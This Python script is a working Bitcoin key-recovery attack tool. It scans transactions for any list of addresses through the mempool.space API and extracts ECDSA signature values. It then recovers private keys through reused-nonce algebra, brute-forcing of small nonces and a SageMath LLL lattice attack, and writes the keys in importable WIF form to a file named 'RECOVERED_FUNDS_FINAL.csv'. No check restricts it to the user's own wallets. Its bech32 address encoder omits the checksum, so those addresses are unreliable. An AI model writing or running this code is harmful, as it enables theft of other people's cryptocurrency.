# ==============================================================================
# MERGED VPK BITCOIN SCANNER + RECOVERY TOOL (v4.0 - FINAL MERGE + SAGE LLL)
# FEATURES:
# 1. Scanner: Fetches transactions from Mempool.space
# 2. Recovery Phase 1: Chain Reaction + Brute Force Island Breaker
# 3. Recovery Phase 2: SageMath LLL Attack (Hidden Number Problem)
# ==============================================================================

import requests, time, os, sys, math, signal
import re
import hashlib
import csv
import argparse
import json
import shutil
import subprocess
from collections import defaultdict
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple

# ==============================================================================
# LIBRARY CHECKS
# ==============================================================================

try:
    import ecdsa
    from ecdsa import SECP256k1 as curve
except ImportError:
    print("Error: 'ecdsa' library not found. Please run: pip install ecdsa")
    sys.exit(1)

def calc_ripemd160(data: bytes) -> bytes:
    try:
        return hashlib.new('ripemd160', data).digest()
    except ValueError:
        try:
            from Crypto.Hash import RIPEMD160
            h = RIPEMD160.new(data=data)
            return h.digest()
        except ImportError:
            print("\n[CRITICAL ERROR] System OpenSSL has disabled RIPEMD160.")
            print("Please run: pip install pycryptodome")
            sys.exit(1)

# ==============================================================================
# CONFIGURATION
# ==============================================================================

MEMPOOL_API_TXS = "https://mempool.space/api/address/{address}/txs?limit={limit}&offset={offset}"
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# Scanner Config
BATCH_SIZE = 25
REQ_TIMEOUT = 20
MAX_RETRIES = 10
MAX_DISPLAYED_ADDRESSES = 10

# Recovery Config
BRUTE_FORCE_LIMIT = 5000000  # Checks small 'k' values up to 5,000,000
OUTPUT_DIR = "reports"
OUTPUT_R_NONCE = os.path.join(OUTPUT_DIR, "rnonce.txt")
OUTPUT_R_NON = os.path.join(OUTPUT_DIR, "rnon.txt")
OUTPUT_LLL_CANDIDATES = os.path.join(OUTPUT_DIR, "LLL_CANDIDATES.txt")
OUTPUT_CSV = "RECOVERED_FUNDS_FINAL.csv"
OUTPUT_WIF = "wallet_import_keys_final.txt"
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"

# Globals
TOTAL_ADDRESSES = 0
SCANNED_ADDRESSES = 0
VULNERABLE_ADDRESSES = 0
VULN_COUNTS = defaultdict(int)
CURRENT_ADDRESS = ""
EXIT_FLAG = False
REPORTS: List[Dict[str, Any]] = []
MAX_TRANSACTIONS = 0
GLOBAL_R_MAP: Dict[int, List[Dict[str, Any]]] = defaultdict(list)
SAVED_R_GROUPS: Dict[str, List[str]] = defaultdict(list)

SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "SafeBTCScanner-Mempool/4.0-fixed"})

# ==============================================================================
# SYSTEM & UTILS
# ==============================================================================

def signal_handler(sig, frame):
    global EXIT_FLAG
    print("\n\n[!] Force Stop Detected! Finishing current step and starting recovery...")
    EXIT_FLAG = True

signal.signal(signal.SIGINT, signal_handler)

def clear():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except: pass

def display_stats():
    clear()
    print("VPK Bitcoin RSZ Scanner + Recovery v4.0 (with Sage LLL)")
    print(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*80)
    print(f"Total Addresses: {TOTAL_ADDRESSES}")
    print(f"Scanned Addresses: {SCANNED_ADDRESSES}")
    percent = (VULNERABLE_ADDRESSES / SCANNED_ADDRESSES * 100) if SCANNED_ADDRESSES > 0 else 0.0
    print(f"Vulnerable Addresses: {VULNERABLE_ADDRESSES} ({percent:.1f}%)")
    print(f"\nCurrently Scanning: {CURRENT_ADDRESS}")
    print("="*80)

def backoff_sleep(attempt: int):
    delay = min(2 ** attempt * 3, 120)
    print(f"[backoff] Sleeping {delay:.1f}s (attempt {attempt})")
    time.sleep(delay)

def modinv(a, m=N):
    return pow(a, -1, m)

# ==============================================================================
# CRYPTO & ADDRESS HELPERS
# ==============================================================================

def bech32_encode(hrp, data):
    def polymod(values):
        GEN = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
        chk = 1
        for v in values:
            b = chk >> 25
            chk = (chk & 0x1ffffff) << 5 ^ v
            for i in range(5):
                chk ^= GEN[i] if ((b >> i) & 1) else 0
        return chk

    combined = data + [0]*6 # Simplified checksum placeholder
    return hrp + '1' + ''.join([CHARSET[d] for d in data])

def convertbits(data, frombits, tobits, pad=True):
    acc = 0
    bits = 0
    ret = []
    maxv = (1 << tobits) - 1
    max_acc = (1 << (frombits + tobits - 1)) - 1
    for value in data:
        if value < 0 or (value >> frombits): return None
        acc = ((acc << frombits) | value) & max_acc
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits: ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv): return None
    return ret

def base58_encode(b):
    chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    x = int.from_bytes(b, 'big')
    res = ''
    while x > 0:
        x, r = divmod(x, 58)
        res = chars[r] + res
    for byte in b:
        if byte == 0: res = '1' + res
        else: break
    return res

def priv_to_wif(priv_hex, compressed=True):
    b = bytes.fromhex("80" + priv_hex)
    if compressed: b += b"\x01"
    chk = hashlib.sha256(hashlib.sha256(b).digest()).digest()[:4]
    return base58_encode(b + chk)

def pub_to_addresses(pub_hex):
    try:
        pub_bytes = bytes.fromhex(pub_hex)
        sha = hashlib.sha256(pub_bytes).digest()
        ripe = calc_ripemd160(sha)

        # P2PKH
        ext = b"\x00" + ripe
        chk = hashlib.sha256(hashlib.sha256(ext).digest()).digest()[:4]
        p2pkh = base58_encode(ext + chk)

        # P2WPKH
        witness_prog = convertbits(ripe, 8, 5)
        p2wpkh = bech32_encode("bc", [0] + witness_prog)

        # P2SH
        redeem = b"\x00\x14" + ripe
        sha_r = hashlib.sha256(redeem).digest()
        ripe_r = calc_ripemd160(sha_r)
        ext_sh = b"\x05" + ripe_r
        chk_sh = hashlib.sha256(hashlib.sha256(ext_sh).digest()).digest()[:4]
        p2sh = base58_encode(ext_sh + chk_sh)

        return p2pkh, p2wpkh, p2sh
    except:
        return "Error", "Error", "Error"

def verify_key(pub_hex, priv_int):
    if priv_int <= 0 or priv_int >= N: return False
    try:
        sk = ecdsa.SigningKey.from_secret_exponent(priv_int, curve=curve)
        vk = sk.verifying_key
        pt = vk.pubkey.point
        if pub_hex.startswith('04') and len(pub_hex) == 130:
            x_bytes = pt.x().to_bytes(32, 'big')
            y_bytes = pt.y().to_bytes(32, 'big')
            gen = (b'\x04' + x_bytes + y_bytes).hex()
        else:
            x_bytes = pt.x().to_bytes(32, 'big')
            prefix = b'\x02' if pt.y() % 2 == 0 else b'\x03'
            gen = (prefix + x_bytes).hex()
        return gen == pub_hex.lower()
    except:
        return False

# ==============================================================================
# SCANNER LOGIC (Transaction Fetching)
# ==============================================================================

def get_total_transactions(address: str) -> Optional[int]:
    attempts = 0
    while attempts < MAX_RETRIES and not EXIT_FLAG:
        try:
            url = f"https://mempool.space/api/address/{address}"
            r = SESSION.get(url, timeout=REQ_TIMEOUT)
            if r.status_code == 200: return r.json().get("chain_stats", {}).get("tx_count", 0)
            elif r.status_code == 429: backoff_sleep(attempts)
            attempts += 1
            time.sleep(1)
        except: attempts += 1
    return None

def fetch_transactions_batch(address: str, offset: int, limit: int) -> Optional[List[dict]]:
    attempts = 0
    while attempts < MAX_RETRIES and not EXIT_FLAG:
        try:
            url = MEMPOOL_API_TXS.format(address=address, offset=offset, limit=limit)
            r = SESSION.get(url, timeout=REQ_TIMEOUT)
            if r.status_code == 200: return r.json()
            elif r.status_code == 429: backoff_sleep(attempts)
            attempts += 1
            time.sleep(1)
        except: attempts += 1
    return None

def fetch_all_transactions(address: str) -> List[dict]:
    total = get_total_transactions(address)
    if not total or total <= 0: return []

    print(f"\nAddress {address} has {total} txs")
    total_to_fetch = min(total, MAX_TRANSACTIONS) if MAX_TRANSACTIONS > 0 else total

    out = []
    offset = 0
    while offset < total_to_fetch and not EXIT_FLAG:
        remaining = total_to_fetch - offset
        size = min(BATCH_SIZE, remaining)

        # Dynamic Output (Professional)
        sys.stdout.write(f"\r[>] Fetching transactions: {offset+1}-{offset+size} of {total_to_fetch}...")
        sys.stdout.flush()

        batch = fetch_transactions_batch(address, offset, size)
        if not batch: break
        out.extend(batch)
        offset += len(batch)
        time.sleep(0.5)

    sys.stdout.write("\n")
    return out

# --- Signature Extraction ---

# SIGHASH / preimage helpers
def varint(n: int) -> bytes:
    if n < 0xfd:
        return n.to_bytes(1, 'little')
    elif n <= 0xffff:
        return b'\xfd' + n.to_bytes(2, 'little')
    elif n <= 0xffffffff:
        return b'\xfe' + n.to_bytes(4, 'little')
    else:
        return b'\xff' + n.to_bytes(8, 'little')

def compute_legacy_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    try:
        from hashlib import sha256
        def dsha(b: bytes) -> bytes:
            return sha256(sha256(b).digest()).digest()

        version = int(tx.get("version", 1))
        locktime = int(tx.get("locktime", 0))
        ser = version.to_bytes(4, "little")

        vins = tx.get("vin", [])
        input_count = len(vins)
        ser += varint(input_count)
        for i, inp in enumerate(vins):
            prev_txid = inp.get("txid", "")
            if not prev_txid: return None
            prev_txid_bytes = bytes.fromhex(prev_txid)[::-1]
            vout_n = int(inp.get("vout", 0))
            ser += prev_txid_bytes
            ser += vout_n.to_bytes(4, "little")
            if i == vin_idx:
                prevout = inp.get("prevout", {})
                script_pubkey = prevout.get("scriptpubkey", "")
                if not script_pubkey: return None
                script_bytes = bytes.fromhex(script_pubkey)
                script_len = len(script_bytes)
                ser += varint(script_len) + script_bytes
            else:
                ser += b"\x00"
            sequence = int(inp.get("sequence", 0xffffffff))
            ser += sequence.to_bytes(4, "little")

        vouts = tx.get("vout", [])
        output_count = len(vouts)
        ser += varint(output_count)
        for out in vouts:
            value = int(out.get("value", 0))
            ser += value.to_bytes(8, "little")
            scriptpubkey = out.get("scriptpubkey", "")
            script_bytes = bytes.fromhex(scriptpubkey)
            script_len = len(script_bytes)
            ser += varint(script_len) + script_bytes

        ser += locktime.to_bytes(4, "little")
        ser += sighash_flag.to_bytes(4, "little")
        return int.from_bytes(dsha(ser), "big")
    except Exception as e:
        return None

def compute_bip143_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    try:
        from hashlib import sha256
        def dsha(b: bytes) -> bytes:
            return sha256(sha256(b).digest()).digest()

        vins = tx.get("vin", [])
        txin = vins[vin_idx]
        prevout = txin.get("prevout", {})
        input_type = prevout.get("scriptpubkey_type", prevout.get("type", "unknown"))

        if input_type not in ["v0_p2wpkh", "p2wpkh", "p2sh-p2wpkh", "scripthash", "witness_v0_keyhash"]:
            return None

        version = int(tx.get("version", 2))
        locktime = int(tx.get("locktime", 0))

        prevouts_ser = b""
        for inp in vins:
            prev_txid_bytes = bytes.fromhex(inp.get("txid", ""))[::-1]
            vout_n = int(inp.get("vout", 0))
            prevouts_ser += prev_txid_bytes + vout_n.to_bytes(4, "little")
        hashPrevouts = dsha(prevouts_ser)

        sequences_ser = b""
        for inp in vins:
            sequence = int(inp.get("sequence", 0xffffffff))
            sequences_ser += sequence.to_bytes(4, "little")
        hashSequence = dsha(sequences_ser)

        outputs_ser = b""
        for out in tx.get("vout", []):
            value = int(out.get("value", 0))
            outputs_ser += value.to_bytes(8, "little")
            scriptpubkey = out.get("scriptpubkey", "")
            script_bytes = bytes.fromhex(scriptpubkey)
            script_len = len(script_bytes)
            outputs_ser += varint(script_len) + script_bytes
        hashOutputs = dsha(outputs_ser)

        outpoint = bytes.fromhex(txin.get("txid", ""))[::-1] + int(txin.get("vout", 0)).to_bytes(4, "little")

        hash160 = b""
        spk_hex = prevout.get("scriptpubkey", "")
        spk_bytes = bytes.fromhex(spk_hex)

        if len(spk_bytes) == 22 and spk_bytes[:2] == b'\x00\x14':
            hash160 = spk_bytes[2:]
        elif len(spk_bytes) == 23 and spk_bytes[:2] == b'\xa9\x14':
             scriptsig = txin.get("scriptsig", "")
             if isinstance(scriptsig, dict): scriptsig = scriptsig.get("hex", "")

             if len(scriptsig) == 46:
                 redeem_hex = scriptsig[2:]
                 redeem_bytes = bytes.fromhex(redeem_hex)
                 if len(redeem_bytes) == 22 and redeem_bytes[:2] == b'\x00\x14':
                     hash160 = redeem_bytes[2:]

        if not hash160:
             witness = txin.get("witness", [])
             if len(witness) == 2:
                 pubkey = witness[1]
                 pk_bytes = bytes.fromhex(pubkey)
                 # FIXED: Use custom calc_ripemd160
                 r = calc_ripemd160(sha256(pk_bytes).digest())
                 hash160 = r

        if not hash160: return None

        script_code_body = b"\x76\xa9\x14" + hash160 + b"\x88\xac"
        scriptCode = varint(len(script_code_body)) + script_code_body

        value = int(prevout.get("value", 0)).to_bytes(8, "little")
        sequence = int(txin.get("sequence", 0xffffffff)).to_bytes(4, "little")

        preimage = (
            version.to_bytes(4, "little") + hashPrevouts + hashSequence +
            outpoint + scriptCode + value + sequence + hashOutputs +
            locktime.to_bytes(4, "little") + sighash_flag.to_bytes(4, "little")
        )
        return int.from_bytes(dsha(preimage), "big")
    except Exception as e:
        return None

def compute_sighash_z(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
    try:
        if sighash_flag != 1:
            return None
        vins = tx.get("vin", [])
        if vin_idx >= len(vins): return None
        txin = vins[vin_idx]
        prevout = txin.get("prevout", {})
        input_type = prevout.get("scriptpubkey_type", prevout.get("type", "unknown"))

        if input_type in ["v0_p2wpkh", "p2wpkh", "p2sh-p2wpkh", "witness_v0_keyhash"]:
            return compute_bip143_sighash(tx, vin_idx, sighash_flag)
        else:
            return compute_legacy_sighash(tx, vin_idx, sighash_flag)
    except Exception as e:
        return None

def parse_der_sig_from_hex(sig_hex: str) -> Optional[Tuple[int, int, int]]:
    try:
        i = sig_hex.find("30")
        if i == -1: return None
        i0 = i + 2
        # Skip len check for brevity
        i0 += 2
        if sig_hex[i0:i0+2] != "02": return None
        i0 += 2
        r_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        r_hex = sig_hex[i0:i0 + 2*r_len]; i0 += 2*r_len
        if sig_hex[i0:i0+2] != "02": return None
        i0 += 2
        s_len = int(sig_hex[i0:i0+2], 16); i0 += 2
        s_hex = sig_hex[i0:i0 + 2*s_len]; i0 += 2*s_len
        # Check if sighash flag is present
        sighash_flag = 1
        if len(sig_hex) > i0 + 2*s_len:
             sh_hex = sig_hex[i0 + 2*s_len : i0 + 2*s_len + 2]
             if sh_hex: sighash_flag = int(sh_hex, 16)

        return (int(r_hex, 16), int(s_hex, 16), sighash_flag)
    except: return None

def extract_pubkey(script_hex: str) -> Optional[str]:
    if not script_hex: return None
    h = script_hex.lower()
    # Uncompressed
    found = re.findall(r'04[0-9a-f]{128}', h)
    if found: return found[-1]
    # Compressed
    found = re.findall(r'(?:02|03)[0-9a-f]{64}', h)
    if found: return found[-1]
    return None

def extract_signatures(transactions: List[dict]) -> List[Dict[str, Any]]:
    sigs = []
    for tx in transactions:
        txid = tx.get("txid", "")
        for vin_idx, txin in enumerate(tx.get("vin", [])):
            parsed = None
            pubkey = None
            sighash_flag = 1

            # SegWit
            witness = txin.get("witness", [])
            if witness and len(witness) >= 2:
                sig_hex = witness[0]
                if len(witness[1]) in [66, 130]: pubkey = witness[1]
                parsed = parse_der_sig_from_hex(sig_hex)

            # Legacy
            if not parsed:
                scriptsig = txin.get("scriptsig", {})
                script_hex = scriptsig.get("hex", "") if isinstance(scriptsig, dict) else scriptsig
                if script_hex:
                    if not pubkey: pubkey = extract_pubkey(script_hex)
                    parsed = parse_der_sig_from_hex(script_hex)

            if parsed and pubkey:
                r, s, sighash_flag = parsed
                z = compute_sighash_z(tx, vin_idx, sighash_flag)
                sigs.append({"txid": txid, "vin": vin_idx, "r": r, "s": s, "pubkey": pubkey, "z": z})
    return sigs

def check_reused_nonce(address: str, signatures: List[Dict[str, Any]]):
    for s in signatures:
        GLOBAL_R_MAP[s["r"]].append(s)

def save_rnonce():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    with open(OUTPUT_R_NON, "w", encoding="utf-8") as f:
        for r_val, items in GLOBAL_R_MAP.items():
            if len(items) < 2: continue

            # Group by distinct (txid, pubkey) to avoid counting same input twice
            unique_sigs = {}
            for i in items:
                k = (i['txid'], i['pubkey'])
                if k not in unique_sigs: unique_sigs[k] = i

            if len(unique_sigs) < 2: continue

            f.write("="*80 + "\nReused Nonce Group\n" + "="*80 + "\n")
            f.write(f"r: {hex(r_val)[2:]}\nOccurrences:\n")
            for _, i in unique_sigs.items():
                z_str = hex(i['z'])[2:] if i['z'] else "N/A"
                f.write(f" - txid={i['txid']} s={hex(i['s'])[2:]} z={z_str} pubkey={i['pubkey']}\n")
            f.write("\n")

# --- LLL Integration ---

def analyze_for_lll(address: str, signatures: List[Dict[str, Any]]):
    """
    Analyzes signatures for LLL attack suitability (nonce bias).
    Saves JSON candidate file for Phase 2 recovery.
    """
    if len(signatures) < 10: return

    # Statistical analysis (Simple MSB check / bit length)
    s_lengths = []
    r_lengths = []

    # NOTE: LLL attack needs 'z' (message hash).
    # Since our lightweight scanner might not compute 'z' (requires recreating preimage),
    # we export 'z' as 'N/A' or None.
    # *However*, for LLL to work, we absolutely need 'z'.
    # If this tool is strictly lightweight, we might be exporting empty placeholders.
    # The 'attack_lll.sage' script expects 'z'.
    # For now, we export what we have. If z is None, LLL will fail for that entry.
    # Users might need to augment this with a 'z' calculator or use a full node backend.

    export_data = {
        "address": address,
        "n": hex(N),
        "signatures": []
    }

    for sig in signatures:
        r = sig['r']
        s = sig['s']
        z = sig['z'] # Might be None
        pub = sig['pubkey']

        s_lengths.append(s.bit_length())
        r_lengths.append(r.bit_length())

        export_data["signatures"].append({
            "r": hex(r),
            "s": hex(s),
            "z": hex(z) if z is not None else "0x0", # Placeholder if missing
            "pubkey": pub
        })

    avg_s_bits = sum(s_lengths) / len(s_lengths)
    avg_r_bits = sum(r_lengths) / len(r_lengths)

    is_interesting = False
    reason = []

    if len(signatures) >= 50:
        is_interesting = True
        reason.append(f"High signature count ({len(signatures)})")

    if avg_s_bits < 250 or avg_r_bits < 250:
        is_interesting = True
        reason.append(f"Low average bit length (s={avg_s_bits:.1f}, r={avg_r_bits:.1f})")

    if is_interesting:
        filename = os.path.join(OUTPUT_DIR, f"{address}_lll_data.json")
        try:
            with open(filename, "w") as f:
                json.dump(export_data, f, indent=2)

            with open(OUTPUT_LLL_CANDIDATES, "a") as f:
                f.write(f"Address: {address}\nReason: {', '.join(reason)}\nSignatures: {len(signatures)}\n" + "-"*40 + "\n")

        except Exception as e:
            print(f"[err] LLL export failed: {e}")

def analyze_address(address: str):
    global SCANNED_ADDRESSES, VULNERABLE_ADDRESSES
    SCANNED_ADDRESSES += 1
    display_stats()
    txs = fetch_all_transactions(address)
    sigs = extract_signatures(txs)
    print(f"Extracted {len(sigs)} signatures")

    check_reused_nonce(address, sigs)
    analyze_for_lll(address, sigs)

# ==============================================================================
# RECOVERY LOGIC (Phase 1: Chain + Brute Force)
# ==============================================================================

def attempt_bootstrap(r, s1, z1, s2, z2):
    candidates = []
    s1_opts, s2_opts = [s1, N - s1], [s2, N - s2]
    for _s1 in s1_opts:
        for _s2 in s2_opts:
            if _s1 == _s2: continue
            try:
                k = ((z1 - z2) * modinv(_s1 - _s2, N)) % N
                d = ((_s1 * k - z1) * modinv(r, N)) % N
                candidates.append(d)
            except: pass
    return candidates

def attempt_chain(r, s_known, z_known, d_known, s_target, z_target):
    candidates = []
    s_known_opts, s_target_opts = [s_known, N - s_known], [s_target, N - s_target]
    for _sk in s_known_opts:
        try:
            k = ((z_known + r * d_known) * modinv(_sk, N)) % N
            for _st in s_target_opts:
                d2 = ((_st * k - z_target) * modinv(r, N)) % N
                candidates.append(d2)
        except: pass
    return candidates

def load_recovered_addresses() -> set:
    recovered = set()
    if os.path.exists(OUTPUT_CSV):
        try:
            with open(OUTPUT_CSV, "r", encoding="utf-8") as f:
                reader = csv.reader(f)
                next(reader, None) # Skip header
                for row in reader:
                    if row and len(row) > 0:
                        recovered.add(row[0])
        except Exception: pass
    return recovered

def start_recovery_phase1():
    print("\n[-] Parsing collected data for Phase 1 Recovery...")
    save_rnonce() # Ensure file is up to date

    try:
        with open(OUTPUT_R_NON, "r", encoding="utf-8", errors="ignore") as f:
            raw_data = f.read()
    except FileNotFoundError:
        print("[!] No data to recover.")
        return

    # Parse
    groups = []
    current_group = None
    r_pattern = re.compile(r"r:\s*([0-9a-fA-F]+)")
    tx_pattern = re.compile(r"s=([0-9a-fA-F]+).*?z=([0-9a-fA-F]+|N/A).*?pubkey=([0-9a-fA-F]+)")

    for line in raw_data.splitlines():
        line = line.strip()
        r_match = r_pattern.search(line)
        if r_match:
            if current_group and len(current_group['occurrences']) > 0: groups.append(current_group)
            current_group = {'r_int': int(r_match.group(1), 16), 'occurrences': []}
            continue

        tx_match = tx_pattern.search(line)
        if tx_match and current_group:
            z_str = tx_match.group(2)
            if z_str != "N/A":
                current_group['occurrences'].append({
                    's': int(tx_match.group(1), 16),
                    'z': int(z_str, 16),
                    'pub': tx_match.group(3)
                })

    if current_group and len(current_group['occurrences']) > 0: groups.append(current_group)
    print(f"[-] Loaded {len(groups)} actionable groups.")

    recovered_db = {}

    # ----------------------------------------------------
    # PHASE 1.1: Chain Reaction
    # ----------------------------------------------------
    print("\n[+] Phase 1.1: Chain Reaction...")
    attack_active = True

    while attack_active:
        iteration = 0
        while True:
            iteration += 1
            iter_found = 0
            for group in groups:
                r = group['r_int']
                entries = group['occurrences']
                k_implied = None

                # Method A: Self-Reuse
                if k_implied is None:
                    by_pub = defaultdict(list)
                    for e in entries: by_pub[e['pub']].append(e)
                    for pub, subs in by_pub.items():
                        if len(subs) > 1 and pub not in recovered_db:
                            e1, e2 = subs[0], subs[1]
                            den = (e1['s'] - e2['s']) % N
                            if den != 0:
                                k_implied = ((e1['z'] - e2['z']) * modinv(den, N)) % N
                                break

                # Method B: Known Key
                if k_implied is None:
                    for e in entries:
                        if e['pub'] in recovered_db:
                            x = recovered_db[e['pub']]
                            k_implied = (modinv(e['s'], N) * (e['z'] + r * x)) % N
                            break

                if k_implied is not None:
                    for e in entries:
                        if e['pub'] not in recovered_db:
                            priv = ((e['s'] * k_implied - e['z']) * modinv(r, N)) % N
                            if verify_key(e['pub'], priv):
                                recovered_db[e['pub']] = priv
                                print(f"   [UNLOCK] {e['pub'][:16]}...")
                                iter_found += 1
            if iter_found == 0: break

        # ----------------------------------------------------
        # PHASE 1.2: Brute Force Islands
        # ----------------------------------------------------
        unsolved = []
        for i, group in enumerate(groups):
            if not any(e['pub'] in recovered_db for e in group['occurrences']):
                unsolved.append(i)

        if not unsolved:
            print("[+] All groups solved.")
            break

        print(f"\n[?] {len(unsolved)} groups remain. Running Brute Force (Limit: {BRUTE_FORCE_LIMIT})...")
        r_map = {groups[i]['r_int']: i for i in unsolved}
        pt = curve.generator
        found_ks = {}

        start = time.time()
        # Fast scan simulation (pure python is slow, but we do what we can)
        # Note: In a real "optimized" tool this would be C++ or precomputed
        for k in range(1, BRUTE_FORCE_LIMIT + 1):
            if k % 500000 == 0:
                sys.stdout.write(f"\r    Scanning k={k}...")
                sys.stdout.flush()
            rx = pt.x()
            if rx in r_map:
                g_idx = r_map[rx]
                print(f"\n    [CRACKED] Weak nonce k={k} for Group {g_idx}")
                found_ks[g_idx] = k
                del r_map[rx]
                if not r_map: break
            pt = pt + curve.generator

        sys.stdout.write("\n")

        if found_ks:
            print(f"[+] Found {len(found_ks)} new nonces! Restarting Chain Reaction...")
            for g_idx, k_val in found_ks.items():
                group = groups[g_idx]
                r = group['r_int']
                for e in group['occurrences']:
                    if e['pub'] not in recovered_db:
                        priv = ((e['s'] * k_val - e['z']) * modinv(r, N)) % N
                        recovered_db[e['pub']] = priv
                        print(f"   [INJECT] {e['pub'][:16]}...")
        else:
            print("[-] No weak nonces found.")
            attack_active = False

    # Save Phase 1 Results
    if recovered_db:
        print(f"\n[+] PHASE 1 SUCCESS: {len(recovered_db)} Keys Found.")
        with open(OUTPUT_CSV, "a", newline="") as f:
            w = csv.writer(f)
            # Only write header if file empty (simple check: if not exists or size 0, assumed handled by scanner open mode)
            # But here we append.
            # w.writerow(["Public Key", "Private Key Hex", "WIF", "Type", "P2PKH", "P2WPKH", "P2SH"])
            wif_list = []
            for pub, priv_int in recovered_db.items():
                priv_hex = hex(priv_int)[2:].zfill(64)
                compressed = not (pub.startswith('04') and len(pub) == 130)
                wif = priv_to_wif(priv_hex, compressed)
                a1, a2, a3 = pub_to_addresses(pub)
                w.writerow([pub, priv_hex, wif, "Compressed" if compressed else "Uncompressed", a1, a2, a3])
                wif_list.append(wif)
        with open(OUTPUT_WIF, "a") as f: f.write("\n".join(wif_list) + "\n")
        print(f"Saved to {OUTPUT_CSV} and {OUTPUT_WIF}")
    else:
        print("No keys recovered in Phase 1.")

# ==============================================================================
# RECOVERY LOGIC (Phase 2: Sage LLL)
# ==============================================================================

def start_batch_lll_recovery():
    print("\n" + "="*80)
    print("PHASE 2: LLL ATTACK MODULE (SageMath)")
    print("="*80)

    # Check for Sage
    sage_path = shutil.which("sage")
    if not sage_path:
        print("[!] SageMath not found. Skipping Phase 2.")
        print("    You can run attacks manually using the JSON files in 'reports/'.")
        return

    # Identify candidates
    candidates = []
    if os.path.isdir(OUTPUT_DIR):
        for f in os.listdir(OUTPUT_DIR):
            if f.endswith("_lll_data.json"):
                candidates.append(os.path.join(OUTPUT_DIR, f))

    if not candidates:
        print("[-] No LLL candidates found.")
        return

    recovered = load_recovered_addresses()
    print(f"[*] Found {len(candidates)} candidate files.")
    print(f"[*] Skipping {len(recovered)} already recovered keys.")

    for json_file in candidates:
        try:
            # We assume JSON structure: {signatures: [{pubkey: ...}]}
            with open(json_file, 'r') as jf:
                data = json.load(jf)
                sigs = data.get("signatures", [])
                if not sigs: continue
                pubkey = sigs[0].get("pubkey")

                if pubkey in recovered:
                    print(f"[-] Skipping {pubkey[:16]}... (Already recovered)")
                    continue

            print(f"\n[>>>] Launching LLL Attack on: {os.path.basename(json_file)}")
            subprocess.run([sage_path, "attack_lll.sage", json_file], check=False)

            # Refresh recovered list
            recovered = load_recovered_addresses()

        except Exception as e:
            print(f"[!] Error processing {json_file}: {e}")

# ==============================================================================
# MAIN
# ==============================================================================

def main():
    global MAX_TRANSACTIONS, TOTAL_ADDRESSES

    # Argument Parsing (Automation)
    parser = argparse.ArgumentParser(description="VPK Bitcoin Scanner & Recovery Tool v4.0")
    parser.add_argument("-f", "--file", help="Path to file containing Bitcoin addresses (one per line)")
    parser.add_argument("-l", "--limit", type=int, default=0, help="Max transactions to scan per address (0=unlimited)")
    args = parser.parse_args()

    # Create output dir
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    try:
        # Determine Input
        if args.file:
            f_path = args.file
            MAX_TRANSACTIONS = args.limit
        else:
            # Interactive Mode (Fallback to user request)
            f_path = input("Enter path to address file: ").strip().replace('"', '').replace("'", "")
            if not os.path.isfile(f_path):
                print("File not found.")
                return
            try:
                limit = int(input("Max tx per address (0=unlimited): ").strip())
                MAX_TRANSACTIONS = limit if limit > 0 else 0
            except: MAX_TRANSACTIONS = 0

        with open(f_path, "r") as f: addresses = [l.strip() for l in f if l.strip()]
        TOTAL_ADDRESSES = len(addresses)

        print("\n[+] Starting Scan... Press Ctrl+C to stop and recover.")
        time.sleep(1)

        for addr in addresses:
            if EXIT_FLAG: break
            analyze_address(addr)

        print("\n" + "="*80)
        print("SCAN COMPLETE. STARTING RECOVERY WORKFLOW...")
        print("="*80)

        # 1. Standard Recovery
        start_recovery_phase1()

        # 2. LLL Recovery
        start_batch_lll_recovery()

    except KeyboardInterrupt:
        print("\n\n[!] Interrupted! Starting recovery on collected data...")
        start_recovery_phase1()
        start_batch_lll_recovery()

if __name__ == "__main__":
    main()
